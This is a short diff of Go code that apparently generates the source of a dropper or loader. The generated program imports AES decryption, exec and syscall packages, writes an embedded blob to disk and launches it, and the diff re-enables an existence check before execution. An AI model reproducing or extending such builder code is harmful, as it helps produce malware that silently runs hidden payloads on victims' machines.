@@ -63,13 +63,13 @@ func main() {
 	SourceCode := fmt.Sprintf(`
 	package main
 	import (
-		"crypto/aes"
-		"crypto/cipher"
-		"encoding/base64"
-		"os"
-		"os/exec"
-		"strings"
-		"syscall"
+	"crypto/aes"
+	"crypto/cipher"
+	"encoding/base64"
+	"os"
+	"os/exec"
+	"strings"
+	"syscall"
 	)
 	
 	var (
@@ -112,14 +112,16 @@ func main() {
 		_, _ = f.Write([]byte(dmumafile))
 		f.Close()
 
-		//_, err := os.Stat(dstFilecc)
-	
-		//if err == nil {
-	
-			cmda := exec.Command(dstFilecc)
-			_ = cmda.Start()
-	
-		//}
+
+	_, err := os.Stat(dstFilecc)
+
+	if err == nil {
+
+		cmda := exec.Command(dstFilecc)
+		_ = cmda.Start()
+
+	}
+
 	
 	}
 	
